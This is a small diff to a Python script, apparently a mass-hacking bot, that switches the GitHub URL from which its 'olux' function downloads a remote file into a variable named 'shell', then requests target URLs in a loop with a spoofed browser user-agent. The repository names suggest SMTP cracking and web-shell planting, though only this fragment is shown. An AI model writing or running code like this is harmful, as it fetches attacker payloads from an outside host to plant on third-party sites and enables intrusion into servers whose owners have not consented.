@@ -44,7 +44,7 @@ def logo():
 logo()
 
 def olux(url):
-    shell = '<'+requests.get("https://raw.githubusercontent.com/MisterSpyx/PythonBot/master/smtp.txt").text
+    shell = '<'+requests.get("https://raw.githubusercontent.com/AnonH4x0r/MassSmtpCracker/master/smtp.txt").text
     try:
         url = url.replace('\n', '').replace('\r', '')
         rzlt = requests.get(url,  headers = {'User-agent': 'Mozilla/5.0'} ,timeout=7).text
